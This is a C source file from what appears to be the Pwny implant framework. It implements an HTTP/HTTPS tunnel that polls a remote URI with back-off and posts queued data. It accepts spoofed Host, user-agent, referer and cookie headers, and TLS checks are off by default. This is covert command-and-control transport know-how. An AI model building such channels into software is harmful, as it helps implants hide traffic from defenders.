/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _HTTP_H_
#define _HTTP_H_

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#include <pwny/misc.h>
#include <pwny/log.h>
#include <pwny/tunnel.h>
#include <pwny/http_client.h>

#define MUL_NO_OVERFLOW	((size_t)1 << (sizeof(size_t) * 4))

typedef struct
{
    char *uri;
    struct ev_timer timer;
    char **headers;

    struct http_request_data data;
    struct http_request_options options;

    int running;
} http_t;

void *reallocarray(void *optr, size_t nmemb, size_t size)
{
	if ((nmemb >= MUL_NO_OVERFLOW || size >= MUL_NO_OVERFLOW) &&
	    nmemb > 0 && SIZE_MAX / nmemb < size)
	{
		errno = ENOMEM;
		return NULL;
	}

	return realloc(optr, size * nmemb);
}

static int http_add_header(http_t *http, const char *header)
{
    http->headers = reallocarray(http->headers, http->data.num_headers + 1,
                                 sizeof(char *));
    if (!http->headers)
    {
        return -1;
    }

    http->headers[http->data.num_headers] = strdup(header);
    if (http->headers[http->data.num_headers] == NULL)
    {
        return -1;
    }

    return 0;
}

static void http_tunnel_read(struct http_client *client, void *data)
{
    int code;
    int active;

    http_t *http;
    tunnel_t *tunnel;

    active = 0;
    tunnel = data;
    http = tunnel->data;
    code = http_response_code(client);

    if (code > 0)
    {
        if (!http->running)
        {
            http->timer.repeat = 0.1;
            http->running = 1;
        }
    }
    else
    {
        http->running = 0;
    }

    if (code == HTTP_RESPONSE_OK)
    {
        log_debug("* HTTP read event initialized\n");

        if (client->response->bytes > 0)
        {
            log_debug("* Read bytes via HTTP (%d)\n", client->response->bytes);
            queue_move_all(client->response, tunnel->ingress);

            if (tunnel->read_link)
            {
                tunnel->read_link(tunnel->link_data);
            }

            active = 1;
        }
    }

    if (http->running)
    {
        if (active)
        {
            http->timer.repeat = 0.1;
        }
        else if (http->timer.repeat < 10)
        {
            http->timer.repeat = http->timer.repeat < 0.5
                ? 0.5
                : http->timer.repeat * 1.5;
            if (http->timer.repeat > 10)
            {
                http->timer.repeat = 10;
            }
        }
    }
    else
    {
        http->timer.repeat = 10.;
    }

    if (tunnel->active)
    {
        ev_timer_again(tunnel->loop, &http->timer);
        if (!http->running)
        {
            http->timer.repeat = 0;
        }
    }
}

static void http_tunnel_write(tunnel_t *tunnel, queue_t *egress)
{
    http_t *http;
    ssize_t size;

    http = tunnel->data;

    if (egress->bytes <= 0)
    {
        return;
    }

    while ((size = queue_remove_all(egress, &http->data.content)) > 0)
    {
        log_debug("* Writing bytes to HTTP (%d)\n", size);
        http->data.content_length = size;

        http_request(http->uri, HTTP_POST, http_tunnel_read, tunnel,
                     &http->data, &http->options);

        http->data.content_length = 0;
        http->data.content = NULL;

        free(http->data.content);
    }
}

static void http_tunnel_timer(struct ev_loop *loop, struct ev_timer *w, int revents)
{
    tunnel_t *tunnel;
    http_t *http;

    tunnel = w->data;
    http = tunnel->data;

    log_debug("* Requesting %s\n", http->uri);

    http_request(http->uri, HTTP_GET, http_tunnel_read, tunnel,
                 &http->data, &http->options);
}

int http_tunnel_start(tunnel_t *tunnel)
{
    http_t *http;

    char *args;
    char **argv;
    char *host;

    size_t argc;
    size_t iter;

    http = tunnel->data;
    log_debug("* Starting HTTP tunnel context\n");

    http->uri = strdup(tunnel->uri);
    if (http->uri == NULL)
    {
        goto fail;
    }

    http->data.content_type = "application/octet-stream";
    http->options.flags = HTTP_SKIP_TLS;
    http->options.pin = NULL;

    if (http_add_header(http, "Connection: close") != 0)
    {
        goto fail;
    }

    args = strchr(http->uri, '|');

    if (args)
    {
        *args = '\0';

        if (strlen(++args))
        {
            argc = 0;
            argv = misc_argv_split(args, NULL, &argc);

            for (iter = 0; iter + 1 < argc && argv[iter + 1]; iter += 2)
            {
                if (strcmp(argv[iter], "-h") == 0)
                {
                    host = NULL;
                    if (asprintf(&host, "Host: %s", argv[iter + 1]) != -1)
                    {
                        http_add_header(http, host);
                        free(host);
                    }
                }

                if (strcmp(argv[iter], "-u") == 0)
                {
                    http->data.user_agent = strdup(argv[iter + 1]);
                    log_debug("* User Agent: %s\n", http->data.user_agent);
                }

                if (strcmp(argv[iter], "-r") == 0)
                {
                    http->data.referer = strdup(argv[iter + 1]);
                    log_debug("Referer: %s\n", http->data.referer);
                }

                if (strcmp(argv[iter], "-c") == 0)
                {
                    http->data.cookies = strdup(argv[iter + 1]);
                    log_debug("Cookie: %s\n", http->data.cookies);
                }

                if (strcmp(argv[iter], "-e") == 0)
                {
                    http_add_header(http, argv[iter + 1]);
                    log_debug("Header: %s\n", argv[iter + 1]);
                }

                if (strcmp(argv[iter], "-p") == 0)
                {
                    http->options.pin = strdup(argv[iter + 1]);
                    http->options.flags &= ~HTTP_SKIP_TLS;
                    log_debug("* TLS pin: %s\n", http->options.pin);
                }
            }
        }
    }

    http->data.headers = http->headers;

    ev_init(&http->timer, http_tunnel_timer);
    http->timer.data = tunnel;

    http->running = 1;
    http->timer.repeat = 0.1;

    ev_timer_again(tunnel->loop, &http->timer);

    http->timer.repeat = 0;
    tunnel->active = 1;

    return 0;

fail:
    free(http->uri);
    return -1;
}

void http_tunnel_stop(tunnel_t *tunnel)
{
    http_t *http;
    int iter;

    http = tunnel->data;

    log_debug("* Stopping HTTP tunnel context\n");
    ev_timer_stop(tunnel->loop, &http->timer);

    for (iter = 0; iter < http->data.num_headers; iter++)
    {
        free(http->headers[iter]);
    }
    free(http->uri);

    if (http->data.user_agent)
    {
        free(http->data.user_agent);
    }

    if (http->data.referer)
    {
        free(http->data.referer);
    }

    if (http->data.cookies)
    {
        free(http->data.cookies);
    }

    if (http->options.pin)
    {
        free((void *)http->options.pin);
    }
}

int http_tunnel_init(tunnel_t *tunnel)
{
    http_t *http;

    http = calloc(1, sizeof(*http));
    log_debug("* Init HTTP tunnel context\n");

    if (http == NULL)
    {
        return -1;
    }

    tunnel->data = http;

    tunnel->ingress = queue_create();
    tunnel->egress = queue_create();

    return 0;
}

void http_tunnel_exit(tunnel_t *tunnel)
{
    http_t *http;

    http = tunnel->data;
    log_debug("* Exiting HTTP tunnel context\n");

    if (!tunnel->active)
    {
        return;
    }

    http->running = 0;
    tunnel->active = 0;

    queue_free(tunnel->ingress);
    queue_free(tunnel->egress);

    if (http->headers)
    {
        free(http->headers);
    }

    free(http);
}

void register_http_tunnels(tunnels_t **tunnels)
{
    tunnel_callbacks_t http_callbacks;

    http_callbacks.init_cb = http_tunnel_init;
    http_callbacks.start_cb = http_tunnel_start;
    http_callbacks.write_cb = http_tunnel_write;
    http_callbacks.stop_cb = http_tunnel_stop;
    http_callbacks.exit_cb = http_tunnel_exit;

    register_tunnel(tunnels, "http", http_callbacks);
    register_tunnel(tunnels, "https", http_callbacks);
}

#endif
